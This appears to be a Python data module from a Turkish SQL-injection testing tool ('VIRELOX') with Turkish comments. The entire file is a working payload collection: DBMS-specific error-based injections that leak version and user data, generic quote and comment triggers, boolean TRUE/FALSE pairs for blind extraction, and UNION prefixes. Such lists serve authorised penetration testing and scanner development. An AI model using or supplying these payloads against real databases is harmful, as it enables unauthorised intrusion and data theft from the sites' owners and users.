"""
VIRELOX SQLmap Payload Havuzu v4.0
Hata tabanlı, boolean blind ve UNION test payload'ları
Mozilla Public License 2.0 — AltayHR Developers
"""

# ── Hata tabanlı payload'lar (DBMS'e özel) ───────────────────────────────────
HATA_PAYLOADLARI = {
    "MySQL": [
        "extractvalue(1,concat(0x7e,version()))",
        "updatexml(1,concat(0x7e,version()),1)",
        "(SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
        "GTID_SUBSET(CONCAT(0x7e,version()),1)",
        "exp(~(SELECT * FROM(SELECT version())a))",
        "ST_LatFromGeoHash(version())",
    ],
    "PostgreSQL": [
        "CAST(version() AS INT)",
        "1/CAST('a' AS INT)",
        "(SELECT 1 FROM generate_series(1,(SELECT 1 FROM(SELECT pg_sleep(0))a)))",
        "CAST(current_database() AS NUMERIC)",
    ],
    "Microsoft SQL Server": [
        "CONVERT(INT,@@version)",
        "1/0",
        "(SELECT TOP 1 CAST(name AS INT) FROM sysobjects)",
        "1 WHERE 1=CONVERT(INT,system_user)",
    ],
    "Oracle": [
        "CTXSYS.DRITHSX.SN(user,1337)",
        "TO_CHAR(1/0)",
        "utl_inaddr.get_host_address(user)",
        "DBMS_UTILITY.SQLID_TO_SQLHASH('(select/**/banner/**/from/**/v$version)')",
    ],
    "SQLite": [
        "1/0",
        "RAISE(IGNORE)",
        "1 WHERE 1=CAST('a' AS INTEGER)",
    ],
}

# ── Genel hata tetikleyicileri ────────────────────────────────────────────────
GENEL_HATA_TETIKLEYICILER = [
    "'",
    '"',
    "`",
    "\\",
    "';",
    '";',
    "1'",
    '1"',
    "1`",
    "1\\",
    "' OR '",
    "') OR ('",
    "1 AND 1=1",
    "' AND '1'='1",
    "' OR 1=1--",
    "1' OR '1'='1",
    "' OR 'a'='a",
    "1) OR (1=1",
    # Özel karakterler
    "%27",           # URL-encoded '
    "%22",           # URL-encoded "
    "%27%27",        # ''
    "' OR 1=1#",
    "; SELECT 1",
    "1; SELECT 1",
    "' HAVING 1=1--",
    "' GROUP BY columnnames HAVING 1=1--",
    # Yorum ekleri
    "1--",
    "1#",
    "1/*",
]

# ── Boolean çift payload listesi (TRUE / FALSE çiftleri) ─────────────────────
BOOLEAN_CIFTLE = [
    # Klasik
    ("1 AND 1=1-- -",          "1 AND 1=2-- -"),
    ("' AND '1'='1'-- -",      "' AND '1'='2'-- -"),
    ("1 AND TRUE-- -",         "1 AND FALSE-- -"),
    ("1 AND 1=1#",             "1 AND 1=2#"),
    ("1) AND (1=1-- -",        "1) AND (1=2-- -"),
    ("1' AND 1=1-- -",         "1' AND 1=2-- -"),
    ("1 OR 1=1-- -",           "1 OR 1=2-- -"),
    ("1 AND 2>1-- -",          "1 AND 2<1-- -"),
    # Aritmetik
    ("1 AND 1 BETWEEN 1 AND 2--", "1 AND 1 BETWEEN 3 AND 4--"),
    ("1 AND CHAR(65)='A'-- -",    "1 AND CHAR(65)='B'-- -"),
    # Tırnak olmadan
    ("1 AND 1=1",              "1 AND 1=2"),
    ("1 AND (SELECT 1)=1-- -", "1 AND (SELECT 1)=2-- -"),
    # Parantezli
    ("(1) AND (1=1)-- -",      "(1) AND (1=2)-- -"),
    ("1') AND ('1'='1-- -",    "1') AND ('1'='2-- -"),
    # MySQL özel
    ("1 AND LENGTH(database())>0-- -", "1 AND LENGTH(database())>9999-- -"),
    ("1 AND SUBSTRING(version(),1,1)>'0'-- -", "1 AND SUBSTRING(version(),1,1)>'Z'-- -"),
    # Nested
    ("1 AND (SELECT COUNT(*) FROM information_schema.tables)>0-- -",
     "1 AND (SELECT COUNT(*) FROM information_schema.tables)>9999-- -"),
    # SQLite özel
    ("1 AND (SELECT COUNT(*) FROM sqlite_master)>=0-- -",
     "1 AND (SELECT COUNT(*) FROM sqlite_master)>9999-- -"),
]

# ── UNION kolon keşfi için prefix'ler ─────────────────────────────────────────
UNION_PREFIXLER = [
    "-1", "-1'", '-1"', "-1`", "0", "' AND 1=2",
    "1 AND 2=3", "99999",
]

# ── ORDER BY yorum stilleri ───────────────────────────────────────────────────
YORUM_STILLERI = [
    "-- -", "#", "--", "/**/-- -", "--+-", "/*comment*/",
]
